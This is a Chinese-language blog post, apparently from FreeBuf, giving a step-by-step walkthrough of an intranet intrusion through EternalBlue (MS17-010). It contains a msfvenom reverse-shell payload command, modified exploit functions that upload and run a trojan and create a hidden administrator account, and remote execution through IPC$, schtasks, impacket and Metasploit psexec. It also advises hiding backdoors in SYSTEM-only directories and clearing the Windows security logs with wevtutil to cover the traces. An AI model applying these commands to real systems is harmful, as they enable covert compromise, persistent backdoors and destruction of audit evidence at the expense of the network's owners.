**我们今天的故事，从永恒之蓝开始，讲述如何在内网中如何悄无声息的完成一次内网渗透，PTH等章节内容太多，后续跟上……**

## 背景

我们通过跳板成功获得了目标内网的一台机器，发现目标网络拥有健全的防护机制与企业级防护软件，扫描探测和远程登录从暴露的风险角度自然是不被允许的，接下来我们仅借助永恒之蓝完成对内网目标的渗透攻击，只需要跳板机提供的一条socks隧道即可。

首先从轻量级考虑，我们并不会把msf直接接入对方内网，这里推荐下worawit大佬的python版利用工具。

>
> 工具地址:[https://github.com/worawit/MS17-010](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fworawit%2FMS17-010)

## 管道探测

我们接下来以一台目标为例，对目标进行poc探测：

    
    
    python2 checker.py 192.168.154.138

该工具利用基础为管道开放，意味着接下来的exp工作可否顺利开展。

## 程序执行

接下来对木马做好免杀工作，可以说CS或者其他成熟木马，本处演示方便采用了msf生成的木马：

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.154.159 lport=4444 -f exe -o rabbit.exe
    

![](https://image.3001.net/images/20191022/1571758668_5daf224c1fbf1.png!small)

变更如下exp函数，免杀处理后发送木马到目标指定目录并执行，这里吐槽一句，网上的攻略多复制粘贴，为什么都带着作者的demo？在C盘下生成一个空文本，好好读读代码，真的没必要：

    
    
    def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        smb_send_file(smbConn, '/home/rabbit/rabbit.exe', 'C', '/Users/Public/rabbit.exe')
        service_exec(conn, r'cmd /c  c:\\Users\Public\rabbit.exe')
    

python zzz_exploit.py 192.168.154.138

脚本语法是需要管道名称的，如不指定则自动选择，如下上传并执行成功。

![](https://image.3001.net/images/20191022/1571758697_5daf226953a52.png!small)

这里只是个例子，运行的是什么由你决定，自行替换。

## 账户控制

同样，使用zzz_exploit.py，函数变更如下新增账户：

    
    
    def smb_pwn(conn, arch):
        service_exec(conn, r'cmd /c  net user shadow 1q2w3e4r! /add & net localgroup administrators shadow /add')
    

![](https://image.3001.net/images/20191022/1571758715_5daf227bd1e38.png!small)

## IPC$连接

IPC$在内网渗透中的地位一直都是经典，我们在来回顾下基于IPC$的一系列远程操作：

    
    
    #建立ipc$连接
    net use \\192.168.15.180\ipc$ "1q2w3e4r!" /user:rabbitmask
    #断开全部连接
    net use * /del /y
    #将目标C盘映射到本地的z盘,渗透测试一定不要做这个
    net use z: \\IP\c$`
    
    
    
    #把本地文件复制到目标主机的共享目录
    copy C:\Users\RabbitMask\Desktop\rabbit.exe \\192.168.15.180\C$
    #查看文件是否存在：
    dir \\192.168.15.180\C$\rabbit.exe
    
    
    
    #远程增加定时任务：
    at \\192.168.15.180 21:38:00 C:\rabbit.exe
    #取消全部定时任务
    at \\192.168.15.180 /delete /y
    #查看当前定时任务
    at \\192.168.15.180
    

然而在我们的PC>win7版本时，不再支持`at`命令,替代方案为`schtasks`：

    
    
    #创建定时任务
    schtasks /create /tn "test" /tr c:\rabbit.exe /sc once /st 10:02 /S 192.168.15.181 /RU System  /u rabbitmask /p "1q2w3e4r!"
    #查看当前定时任务，如不加/tn test则查看全部
    schtasks /Query /tn test /s 192.168.15.181 /u rabbitmask /p 1q2w3e4r!
    #删除掉刚刚增加的定时任务
    schtasks /Delete /tn test /F /s 192.168.15.181 /u rabbitmask /p 1q2w3e4r!
    #参数解释
    /create表示创建计划任务
    /tn表示任务名
    /tr指定运行的文件
    /sc是任务运行频率
    /st是执行时间
    /s指定远程机器名或ip地址
    /ru指定运行任务的用户权限，这里指定为最高的SYSTEM
    
    
    
    #查看远程目标进程列表：
    tasklist /s 192.168.15.180 /u rabbitmask /p 1q2w3e4r!
    #杀死pid为1000的进程
    taskkill /s 192.168.15.180 /f /pid 1000
    #杀死名为rabbit.exe的进程
    taskkill /s 192.168.15.180 /f /im rabbit.exe
    

## 目录选择

为什么要单独拿出目录选择来说道下呢，我们来看个比较，首先是administrator权限看到的C盘根目录：

![](https://image.3001.net/images/20191022/1571758758_5daf22a69156f.png!small)

然后我们通过木马的提升的system权限看一下：

![](https://image.3001.net/images/20191023/1571760654_5daf2a0e3f6f6.png!small)

可以看到其中有几个目录是用户看不到的，包括administrator，只有system拥有访问权限，这里就是后门最佳的隐藏地点。

其中System Volume Information可写作system~1,不用担心空格等问题:

![](https://image.3001.net/images/20191023/1571760824_5daf2ab8d1581.png!small)

## 会话获取

既然已经创建完账号密码了，想直接执行命令的话ipc$其实并不太方便，我们直接smb登录目标。

为什么不用RDP？我也问过同样的问题，差点没被内网大佬喷死，有些场合RDP确实风险极大，与君共勉。

这里安利个python的第三方库impacket

项目地址：[https://github.com/SecureAuthCorp/impacket](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecureAuthCorp%2Fimpacket)

### smbexec

其中有个打包好的工具smbexec，这里卖个关子，这里会用到，后边讲PTH也会用到。

    
    
    python smbexec.py rabbitmask:1q2w3e4r!@192.168.15.181
    

![](https://image.3001.net/images/20191023/1571760845_5daf2acd203a7.png!small)

这里我们已成功通过smb登录目标，且权限为system，因为它的原理是创建服务运行，即`sc`,权限为最高权限system，最后建议退出方式exit，否则可能有未知错误，尝试指定下共享路径。

    
    
    python smbexec.py rabbitmask:1q2w3e4r!@192.168.15.181 -share admin$
    

这里插一句，共享路径是指的即逻辑共享(`C$,D$,E$……`)和系统目录(`ADMIN$`)共享，可通过`net share`了解：

![](https://image.3001.net/images/20191023/1571760881_5daf2af12d41b.png!small)

### wmiexec

这是后来smbexec出现编码bug，大佬推荐的另一款工具，同属impacket包，他的使用需要调用wmi服务，占用目标的445、135和另一个随机端口，而smbexec只使用445端口，这一块协议/服务底层问题感兴趣的可以继续深入研究。

    
    
    python wmiexec.py rabbitmask:1q2w3e4r!@192.168.15.181
    

### msf_psexec

上述脚本在应对某些目标机是可能存在命令编码问题，这可能是python环境导致的，所有依然提供个保底方案，msf。

    
    
    use exploit/windows/smb/psexec
    set rhosts 192.168.15.181
    set smbuser rabbitmask
    set smbpass 1q2w3e4r!
    

![](https://image.3001.net/images/20191023/1571800619_5dafc62b8427b.png!small)

不过它默认会植入meterpreter进行反弹shell！关键它没默认做免杀，意味着会触发杀软，所以我们搁到最后保底，真要用的话处理下payload，太自动化有时未必是件好事，与其相信谣言，不如自己思考下为什么在这里笔者如此不推荐笔者所钟爱的msf。

## 日志清理

适用范围>=win7，我们的操作主要存在于安全日志，无脑全清的话如下即可，当然，单条删除日志不嫌麻烦的话亦可，奇安信的A-team好像还有一款日志进程kill工具（渗透结束再拉起），但测试不太稳定，大家自行抉择。

wevtutil gl security查看SECURITY日志的详细信息

![](https://image.3001.net/images/20191023/1571760967_5daf2b472ab3f.png!small)

wevtutil cl security清空SECURITY日志

![](https://image.3001.net/images/20191023/1571760983_5daf2b576aafd.png!small)

同理可操作其他日志：APPLICATION、SETUP、SYSTEM、FORWARDEDEVENTS。

就这样，我们悄无声息的在目标机逛了一圈安全撤离，并留下了永久后门，篇幅限制，PTH、PTT、域渗透等内容不做展开，敬请期待。

 ***本文原创作者：rabbitmask，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

